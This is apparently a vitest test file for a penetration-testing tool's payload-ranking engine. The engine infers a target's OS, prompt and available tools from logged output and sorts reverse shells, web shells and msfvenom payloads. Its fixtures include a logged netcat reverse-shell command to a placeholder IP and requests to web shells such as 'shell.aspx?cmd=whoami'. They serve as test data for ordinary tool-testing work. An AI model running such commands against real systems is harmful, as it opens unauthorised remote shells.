import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import { PASTE_CONTEXTS, type PasteContext } from "../../../engines/payloads/context";
import {
  callbackClue, inferContext, inferredTools, inferSituation, rankPayloads, TOOL_LABEL, type PayloadSituation, type Toggles,
} from "../../../engines/payloads/fit";
import { SHELLS } from "../../../engines/payloads/shells";
import { MSFVENOM } from "../../../engines/payloads/msfvenom";
import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";
import type { PayloadDef, ToolId } from "../../../engines/payloads/types";
import type { Host } from "../../../types/host";
import type { LogEntry } from "../../../types/log";
import type { Service } from "../../../types/service";

const host = (over: Partial<Host> = {}): Host => ({
  id: "h1", engagementId: "e1", name: "TARGET-A", ip: "198.51.100.5", os: null, boardColumn: "initial-foothold",
  boardManual: false, access: "none", createdAt: 0, updatedAt: 0, dualHomed: false, boardDerived: null,
  accessReviewedAt: null, adSet: null, adSetEffective: false, ...over,
});
const svc = (port: number, name: string, version: string | null, over: Partial<Service> = {}): Service => ({
  id: `s${port}`, hostId: "h1", port, protocol: "tcp", state: "open", nmapService: name, nmapVersion: version,
  confirmedProduct: null, confirmedVersion: null, confirmedEntryId: null, verdict: null, createdAt: 0, updatedAt: 0, ...over,
});
const at1402 = new Date(2026, 10, 7, 14, 2).getTime();
const cmdEntry = (command: string, output: string, at = at1402, kind: "command" | "http" = "command"): LogEntry => ({
  id: `l${at}`, engagementId: "e1", kind, title: "t", titleEdited: false, ranOn: null, hostIds: ["h1"],
  observations: null, returnedNothing: false, private: false, at, createdAt: at, updatedAt: at,
  content: kind === "command" ? { kind: "command", blocks: [{ command, output }] } : { kind: "http", request: command, response: output },
});
const base: PayloadSituation = {
  os: null, services: [], prompt: null, webShellUrl: null, tools: { present: [], absent: [] },
  failedPayloadIds: [], exam: false, dbEngine: null,
};
const ids = (defs: PayloadDef[]) => defs.map((d) => d.id);

describe("fit engine", () => {
  it("IIS + logged ?cmd= URL infers windows + webshell-param, best fit ps-b64", () => {
    const { situation, evidence } = inferSituation({
      host: host(), services: [svc(80, "http", "Microsoft IIS httpd 10.0")],
      entries: [cmdEntry("curl 'http://198.51.100.5/shell.aspx?cmd=whoami'", "")], examKind: false,
    });
    expect(situation.os).toBe("windows");
    expect(evidence.os).toBe("from nmap (Microsoft IIS httpd 10.0 on 80)");
    expect(situation.webShellUrl).toBe("http://198.51.100.5/shell.aspx?cmd=");
    expect(evidence.webShellUrl).toBe("from your 14:02 log entry");
    const ctx = inferContext(situation);
    expect(ctx).toBe("webshell-param");
    expect(rankPayloads(REVERSE_SHELLS, situation, ctx).fits[0].id).toBe("ps-b64");
  });

  it("a payload that failed here is marked 'Failed here before' and sorts last, still a fit", () => {
    const s = { ...base, os: "windows" as const, failedPayloadIds: ["nc-exe"] };
    const r = rankPayloads(REVERSE_SHELLS, s, null);
    expect(r.misfits.map((m) => m.def.id)).not.toContain("nc-exe");
    expect(r.marks["nc-exe"]).toEqual(["Failed here before"]);
    expect(ids(r.fits).at(-1)).toBe("nc-exe");
  });

  it("absent python3 marks python3 'Needs python3'", () => {
    const { situation } = inferSituation({
      host: host({ os: "linux" }), services: [],
      entries: [cmdEntry("which python3 python", "")], examKind: false,
    });
    expect(situation.tools.absent).toEqual(expect.arrayContaining(["python3", "python"]));
    const r = rankPayloads(REVERSE_SHELLS, situation, null);
    expect(r.misfits.map((m) => m.def.id)).not.toContain("python3");
    expect(r.marks.python3).toEqual(["Needs python3"]);
  });

  it("os null lists both OSes as fits and context null, nothing empty", () => {
    const { situation } = inferSituation({ host: host(), services: [], entries: [], examKind: false });
    expect(situation.os).toBeNull();
    expect(inferContext(situation)).toBeNull();
    const r = rankPayloads(REVERSE_SHELLS, situation, null);
    expect(r.misfits).toEqual([]);
    expect(ids(r.fits)).toEqual(ids(REVERSE_SHELLS));
  });

  it("prompt 'PS C:\\>' in the latest output infers powershell", () => {
    const { situation, evidence } = inferSituation({
      host: host({ os: "windows" }), services: [],
      entries: [
        cmdEntry("old", "C:\\Users\\a>", at1402 - 60000),
        cmdEntry("whoami", "example\\svc\nPS C:\\Users\\svc> ", at1402),
      ], examKind: false,
    });
    expect(situation.prompt).toBe("ps");
    expect(evidence.prompt).toBe("from your 14:02 log entry");
    expect(inferContext(situation)).toBe("powershell");
  });

  it("detects cmd and sh prompts", () => {
    const f = (out: string) => inferSituation({ host: host(), services: [], entries: [cmdEntry("x", out)], examKind: false }).situation.prompt;
    expect(f("C:\\inetpub>")).toBe("cmd");
    expect(f("www-data@web01:/var/www$ ")).toBe("sh");
    expect(f("root@web01:/# ")).toBe("sh");
    expect(f("just output")).toBeNull();
  });

  it("reads tools from linPEAS Useful software and which output only", () => {
    const peas = "╔══════════╣ Useful software\n/usr/bin/nc\n/usr/bin/python3\n/usr/bin/gcc\n╔══════════╣ Other\n/usr/bin/curl";
    const { situation } = inferSituation({
      host: host({ os: "linux" }), services: [],
      entries: [cmdEntry("./linpeas.sh", peas), cmdEntry("which php", ""), cmdEntry("which perl", "/usr/bin/perl")], examKind: false,
    });
    expect(situation.tools.present).toEqual(expect.arrayContaining(["nc", "python3", "gcc", "perl"]));
    expect(situation.tools.present).not.toContain("curl");
    expect(situation.tools.absent).toEqual(["php"]);
    const none = inferSituation({ host: host(), services: [], entries: [cmdEntry("echo php nc", "")], examKind: false });
    expect(none.situation.tools).toEqual({ present: [], absent: [] });
  });

  it("infers db engine and linux from services", () => {
    const { situation, evidence } = inferSituation({
      host: host(), services: [svc(22, "ssh", "OpenSSH 8.2p1 Ubuntu 4ubuntu0.5"), svc(3306, "mysql", "MySQL 8.0")],
      entries: [], examKind: true,
    });
    expect(situation.os).toBe("linux");
    expect(situation.dbEngine).toBe("mysql");
    expect(evidence.dbEngine).toBe("from nmap (mysql on 3306)");
    expect(situation.exam).toBe(true);
  });

  it("host OS 'other' maps to null", () => {
    expect(inferSituation({ host: host({ os: "other" }), services: [], entries: [], examKind: false }).situation.os).toBeNull();
  });

  it("misfit reasons in precedence order; wrong OS first", () => {
    const s = { ...base, os: "linux" as const, failedPayloadIds: ["nc-exe"], tools: { present: [], absent: ["nc.exe"] } };
    const r = rankPayloads(REVERSE_SHELLS, s, "bash-prompt");
    const reason = (id: string) => r.misfits.find((m) => m.def.id === id)?.reason;
    expect(reason("nc-exe")).toBe("Wrong OS (linux)");
    expect(reason("ps-b64")).toBe("Wrong OS (linux)");
    const w = rankPayloads(REVERSE_SHELLS, { ...base, os: "windows" }, "bash-prompt");
    expect(w.misfits.find((m) => m.def.id === "nc-exe")?.reason).toBe("Doesn't work in Bash prompt");
    const nc = rankPayloads(REVERSE_SHELLS, { ...base, os: "windows", tools: { present: [], absent: ["nc.exe"] } }, null);
    expect(nc.misfits.map((m) => m.def.id)).not.toContain("nc-exe");
    expect(nc.marks["nc-exe"]).toEqual(["Needs nc with -e"]);
  });

  it("keeps catalogue order among fits and sends non-matching contexts to misfits", () => {
    const s = { ...base, os: "linux" as const };
    const r = rankPayloads([...REVERSE_SHELLS].reverse(), s, "bash-prompt");
    expect(ids(r.fits)).toEqual(ids([...REVERSE_SHELLS].reverse().filter((d) => d.os === "linux")));
    const only = rankPayloads(REVERSE_SHELLS, { ...base, os: null }, "cmd");
    expect(ids(only.fits)).toEqual(["ps-b64", "nishang-cradle", "nc-exe", "ps-tls"]);
  });

  it("a mid-output # or $ line does not set a prompt; bash-5.1$ and sh-4.4$ do", () => {
    const f = (out: string) => inferSituation({ host: host(), services: [], entries: [cmdEntry("x", out)], examKind: false }).situation.prompt;
    expect(f("# comment\n$\n/dev/sda1 / ext4\nlast line")).toBeNull();
    expect(f("#\nsomething")).toBeNull();
    expect(f("bash-5.1$ ")).toBe("sh");
    expect(f("sh-4.4$")).toBe("sh");
  });

  it("which parsing handles compound and redirected forms", () => {
    const { situation } = inferSituation({
      host: host(), services: [],
      entries: [cmdEntry("which python3; which php 2>/dev/null || which nc", "/usr/bin/python3\n/usr/bin/nc")], examKind: false,
    });
    expect(situation.tools.present.sort()).toEqual(["nc", "python3"]);
    expect(situation.tools.absent).toEqual(["php"]);
  });

  it("entries run elsewhere are ignored; a newer prompt-less entry keeps the prompt", () => {
    const { situation } = inferSituation({
      host: host({ name: "TARGET-A" }), services: [],
      entries: [
        cmdEntry("whoami", "PS C:\\Users\\svc>", at1402 - 120000),
        cmdEntry("./linpeas.sh", "lots of output\nno prompt here", at1402),
        { ...cmdEntry("id", "user@kali:~$", at1402 + 1000), ranOn: "kali" },
      ], examKind: false,
    });
    expect(situation.prompt).toBe("ps");
    const own = inferSituation({
      host: host({ name: "TARGET-A" }), services: [],
      entries: [{ ...cmdEntry("id", "www@web01:/tmp$", at1402), ranOn: "TARGET-A" }], examKind: false,
    });
    expect(own.situation.prompt).toBe("sh");
  });

  it("only open services count for OS and db engine", () => {
    const { situation } = inferSituation({
      host: host(), services: [svc(80, "http", "Microsoft IIS httpd 10.0", { state: "closed" }), svc(3306, "mysql", null, { state: "filtered" })],
      entries: [], examKind: false,
    });
    expect(situation.os).toBeNull();
    expect(situation.dbEngine).toBeNull();
    expect(situation.services).toEqual([]);
    expect(inferSituation({ host: host(), services: [svc(3306, "mysql", null, { state: "OPEN" })], entries: [], examKind: false }).situation.dbEngine).toBe("mysql");
  });

  it("exam never folds a payload", () => {
    const r = rankPayloads(MSFVENOM, { ...base, exam: true, os: "windows" }, null);
    const win = MSFVENOM.filter((d) => d.os === "windows" || d.os === "any");
    expect(ids(win).every((id) => ids(r.fits).includes(id))).toBe(true);
    expect(r.misfits.map((m) => m.reason)).not.toContain("Not allowed in the exam");
    const src = readFileSync(resolve(__dirname, "../../../engines/payloads/fit.ts"), "utf8");
    expect(src).not.toContain("Not allowed in the exam");
  });
});

describe("service preference (spec §4.2): a soft sort key, never a fold", () => {
  const situationFor = (services: Service[]) => inferSituation({ host: host(), services, entries: [], examKind: false }).situation;

  it("IIS puts the ASPX first; the rest keep catalogue order", () => {
    const s = situationFor([svc(80, "http", "Microsoft IIS httpd 10.0")]);
    const r = rankPayloads(MSFVENOM, s, null);
    const windows = ids(MSFVENOM.filter((d) => d.os === "windows" || d.os === "any"));
    expect(ids(r.fits)).toEqual(["msf-win-x64-aspx", ...windows.filter((id) => id !== "msf-win-x64-aspx")]);
    expect(r.misfits.map((m) => m.def.id)).toEqual(ids(MSFVENOM.filter((d) => d.os === "linux")));
    expect(ids(r.fits)).toContain("msf-php-met");
  });

  it("Tomcat puts the WAR first", () => {
    const s = situationFor([svc(22, "ssh", "OpenSSH 8.9p1 Ubuntu 3"), svc(8080, "http", "Apache Tomcat/Coyote JSP engine 1.1")]);
    expect(s.os).toBe("linux");
    expect(ids(rankPayloads(MSFVENOM, s, null).fits)).toEqual(["msf-java-war", ...ids(MSFVENOM.filter((d) => (d.os === "linux" || d.os === "any") && d.id !== "msf-java-war"))]);
  });

  it("Apache/PHP leaves msfvenom alone and puts php-exec first among the reverse shells", () => {
    const s = situationFor([svc(80, "http", "Apache httpd 2.4.52 ((Ubuntu))")]);
    expect(ids(rankPayloads(MSFVENOM, s, null).fits)).toEqual(ids(MSFVENOM.filter((d) => d.os === "linux" || d.os === "any")));
    const linux = ids(REVERSE_SHELLS.filter((d) => d.os === "linux"));
    expect(ids(rankPayloads(REVERSE_SHELLS, s, null).fits)).toEqual(["php-exec", ...linux.filter((id) => id !== "php-exec")]);
    // Tomcat's "Apache" is not Apache httpd.
    const tomcat = situationFor([svc(8080, "http", "Apache Tomcat/Coyote JSP engine 1.1")]);
    expect(rankPayloads(REVERSE_SHELLS, tomcat, null).fits[0]!.id).toBe("bash-tcp");
  });

  it("no services: catalogue order", () => {
    expect(ids(rankPayloads(MSFVENOM, base, null).fits)).toEqual(ids(MSFVENOM));
    expect(ids(rankPayloads(REVERSE_SHELLS, base, null).fits)).toEqual(ids(REVERSE_SHELLS));
  });
});

describe("failure memory wiring", () => {
  it("a logged failed nc-exe entry marks nc-exe 'Failed here before'", () => {
    const failed: LogEntry = { ...cmdEntry("nc.exe 192.0.2.10 443 -e cmd", "Access is denied."), payloadId: "nc-exe" };
    const { situation } = inferSituation({ host: host(), services: [], entries: [failed], examKind: false });
    expect(situation.failedPayloadIds).toEqual(["nc-exe"]);
    const { fits, misfits, marks } = rankPayloads(REVERSE_SHELLS, situation, null);
    expect(ids(fits)).toContain("nc-exe");
    expect(misfits).toEqual([]);
    expect(marks["nc-exe"]).toEqual(["Failed here before"]);
  });
});

const RELIABLE = ["bash-tcp", "mkfifo-nc", "mkfifo-nc-bg", "python3", "php-exec", "ps-b64", "powercat-cradle", "nishang-cradle", "nc-exe"];
const ALL_TOOLS: ToolId[] = ["bash", "python3", "perl", "nc", "nc-e", "socat", "powershell", "curl", "wget"];
const blocked = (tools: Toggles["tools"] = {}): Toggles => ({ callbacksBlocked: true, tools });

describe("marks: toggles and tools never fold", () => {
  it("reliables never fold", () => {
    const allMissing = Object.fromEntries(ALL_TOOLS.map((t) => [t, "missing"])) as Toggles["tools"];
    const absent = ["php", "nc.exe", ...ALL_TOOLS];
    for (const os of ["linux", "windows", null] as const) {
      for (const ctx of [null, ...PASTE_CONTEXTS.map((c) => c.id)] as (PasteContext | null)[]) {
        for (const callbacksBlocked of [true, false]) {
          for (const missing of [true, false]) {
            const s: PayloadSituation = {
              ...base, os, failedPayloadIds: RELIABLE,
              tools: missing ? { present: [], absent } : { present: [], absent: [] },
            };
            const r = rankPayloads(SHELLS, s, ctx, { callbacksBlocked, tools: missing ? allMissing : {} });
            for (const id of RELIABLE) {
              const d = SHELLS.find((x) => x.id === id)!;
              if ((os && d.os !== os) || (ctx && !d.contexts.includes(ctx))) continue;
              expect(ids(r.fits), `${id} ${os} ${ctx} ${callbacksBlocked} ${missing}`).toContain(id);
            }
          }
        }
      }
    }
  });

  it("callbacks blocked puts binds first and marks reverses", () => {
    const r = rankPayloads(SHELLS, { ...base, os: "linux" }, "bash-prompt", blocked());
    const binds = ids(SHELLS.filter((d) => d.shape === "bind" && d.os === "linux" && d.contexts.includes("bash-prompt")));
    expect(binds.length).toBeGreaterThan(0);
    expect(ids(r.fits).slice(0, binds.length)).toEqual(binds);
    expect(r.marks["bash-tcp"]).toEqual(["Needs a callback"]);
    for (const d of SHELLS.filter((x) => x.shape)) expect(r.marks[d.id]).toBeUndefined();
    // Uploaded webshells are not reverse: unmarked with callbacks blocked.
    const up = rankPayloads(SHELLS, { ...base, os: "linux" }, "uploaded-file", blocked());
    expect(up.marks["upload-php-cmd"]).toBeUndefined();
    expect(up.marks["upload-php-pentestmonkey"]).toEqual(["Needs a callback"]);
    expect(up.fits[0]!.shape).toBe("webshell");
    // Unblocked: no callback marks, binds keep catalogue order.
    const open = rankPayloads(SHELLS, { ...base, os: "linux" }, "bash-prompt");
    expect(open.marks).toEqual({});
    expect(open.fits[0]!.id).toBe("bash-tcp");
  });

  it("marks come in order: callback, tools, failed", () => {
    const s = { ...base, os: "linux" as const, failedPayloadIds: ["mkfifo-nc"] };
    const r = rankPayloads(SHELLS, s, null, blocked({ nc: "missing" }));
    expect(r.marks["mkfifo-nc"]).toEqual(["Needs a callback", "Needs nc", "Failed here before"]);
    expect(r.marks["bind-mkfifo-nc"]).toEqual(["Needs nc"]);
  });

  it("owner tick beats inference", () => {
    const s = { ...base, os: "linux" as const, tools: { present: [], absent: ["python3"] } };
    expect(rankPayloads(SHELLS, s, null, { callbacksBlocked: false, tools: { python3: "present" } }).marks.python3).toBeUndefined();
    const r = rankPayloads(SHELLS, { ...base, os: "linux" }, null, { callbacksBlocked: false, tools: { perl: "missing" } });
    expect(r.marks.perl).toEqual(["Needs perl"]);
    const unmarked = ids(r.fits).filter((id) => !r.marks[id]);
    expect(ids(r.fits).indexOf("perl")).toBeGreaterThanOrEqual(unmarked.length);
    expect(ids(r.fits).slice(0, unmarked.length)).toEqual(unmarked);
  });

  it("php marks from inference only; awk, busybox and served-file never mark", () => {
    const s = { ...base, os: "linux" as const, tools: { present: [], absent: ["php", "awk", "busybox"] } };
    const r = rankPayloads(SHELLS, s, null);
    expect(r.marks["php-exec"]).toEqual(["Needs php"]);
    expect(r.marks.awk).toBeUndefined();
    expect(r.marks["busybox-nc"]).toBeUndefined();
    const w = rankPayloads(SHELLS, { ...base, os: "windows" }, null, { callbacksBlocked: false, tools: { powershell: "present" } });
    expect(w.marks["powercat-cradle"]).toBeUndefined();
  });

  it("inferredTools maps names to tool ids; nc.exe is nc with -e", () => {
    expect(inferredTools({ ...base, tools: { present: ["nc.exe", "python3", "gcc"], absent: ["perl", "php"] } }))
      .toEqual({ "nc-e": "present", python3: "present", perl: "missing" });
    expect(TOOL_LABEL["nc-e"]).toBe("nc with -e");
    expect(TOOL_LABEL.powershell).toBe("PowerShell");
  });

  it("callbackClue", () => {
    const s = (failed: string[]) => ({ ...base, failedPayloadIds: failed });
    expect(callbackClue(s(["bash-tcp"]), SHELLS)).toBeNull();
    expect(callbackClue(s(["bash-tcp", "python3"]), SHELLS)).toBe("Callbacks failed here twice");
    expect(callbackClue(s(["bash-tcp", "python3", "nc-exe"]), SHELLS)).toBe("Callbacks failed here 3 times");
    expect(callbackClue(s(["bash-tcp", "bind-socat"]), SHELLS)).toBeNull();
    expect(callbackClue(s(["bash-tcp", "upload-php-cmd"]), SHELLS)).toBeNull();
    // Only defs in the list count.
    expect(callbackClue(s(["bash-tcp", "python3"]), SHELLS.filter((d) => d.id !== "python3"))).toBeNull();
  });
  it("a marked preferred def keeps catalogue order among marked defs", () => {
    const s = inferSituation({ host: host(), services: [svc(80, "http", "Apache httpd 2.4.52 ((Ubuntu))")], entries: [], examKind: false }).situation;
    const r = rankPayloads(SHELLS, { ...s, failedPayloadIds: ["php-exec", "bash-tcp"] }, null);
    expect(r.fits[0]!.id).not.toBe("php-exec");
    expect(ids(r.fits).slice(-2)).toEqual(["bash-tcp", "php-exec"]);
  });
});

describe("fit inference cases (prelab batch)", () => {
  it("a raw HTTP request line with a Host header reads as a web shell URL", () => {
    const req = "GET /s.aspx?cmd=id HTTP/1.1\r\nHost: 192.0.2.5\r\nUser-Agent: curl/8.0\r\n\r\n";
    const { situation, evidence } = inferSituation({
      host: host(), services: [], entries: [cmdEntry(req, "uid=0(root)", at1402, "http")], examKind: false,
    });
    expect(situation.webShellUrl).toBe("http://192.0.2.5/s.aspx?cmd=");
    expect(evidence.webShellUrl).toBe("from your 14:02 log entry");
  });

  it("a raw request line with a Host port; port 443 is https; no Host header reads nothing", () => {
    const withPort = inferSituation({
      host: host(), services: [],
      entries: [cmdEntry("POST /up/run.php?exec=whoami HTTP/1.1\nHost: web.example.test:8080\n", "", at1402, "http")], examKind: false,
    });
    expect(withPort.situation.webShellUrl).toBe("http://web.example.test:8080/up/run.php?exec=");
    const tls = inferSituation({
      host: host(), services: [], entries: [cmdEntry("GET /s.aspx?cmd=id HTTP/1.1\nHost: web.example.test:443\n", "", at1402, "http")], examKind: false,
    });
    expect(tls.situation.webShellUrl).toBe("https://web.example.test:443/s.aspx?cmd=");
    const noHost = inferSituation({
      host: host(), services: [], entries: [cmdEntry("GET /s.aspx?cmd=id HTTP/1.1\n", "", at1402, "http")], examKind: false,
    });
    expect(noHost.situation.webShellUrl).toBeNull();
  });

  it("ANSI colour codes in linPEAS output do not defeat tool detection", () => {
    const peas = "\x1b[1;34m╔══════════╣ \x1b[1;32mUseful software\x1b[0m\n\x1b[1;31m/usr/bin/python3\x1b[0m\n/usr/bin/socat\n"
      + "\x1b[1;34m╔══════════╣ \x1b[1;32mOther\x1b[0m\n/usr/bin/curl";
    const { situation } = inferSituation({ host: host(), services: [], entries: [cmdEntry("./linpeas.sh", peas)], examKind: false });
    expect(situation.tools.present.sort()).toEqual(["python3", "socat"]);
  });

  it("OpenSSH for_Windows reads as Windows", () => {
    const { situation, evidence } = inferSituation({
      host: host(), services: [svc(22, "ssh", "OpenSSH for_Windows_8.1 (protocol 2.0)")], entries: [], examKind: false,
    });
    expect(situation.os).toBe("windows");
    expect(evidence.os).toBe("from nmap (OpenSSH for_Windows_8.1 (protocol 2.0) on 22)");
  });

  it("which python3>/dev/null reads python3, not python", () => {
    const { situation } = inferSituation({
      host: host(), services: [], entries: [cmdEntry("which python3>/dev/null && which perl 2>/dev/null", "/usr/bin/python3")], examKind: false,
    });
    expect(situation.tools.present).toEqual(["python3"]);
    expect(situation.tools.absent).toEqual(["perl"]);
  });

  it("a confirmed product is the evidence, named as confirmed, not the nmap string", () => {
    const { evidence } = inferSituation({
      host: host(),
      services: [svc(80, "http", "Microsoft IIS httpd 10.0 (Microsoft-IIS/10.0; ASP.NET)", { confirmedProduct: "Microsoft IIS", confirmedVersion: "10.0" })],
      entries: [], examKind: false,
    });
    expect(evidence.os).toBe("from the confirmed service (Microsoft IIS 10.0 on 80)");
    const db = inferSituation({
      host: host(), services: [svc(3306, "mysql", "MySQL 8.0.36-0ubuntu0.22.04.1", { confirmedProduct: "MariaDB" })], entries: [], examKind: false,
    });
    expect(db.evidence.dbEngine).toBe("from the confirmed service (MariaDB on 3306)");
  });
});
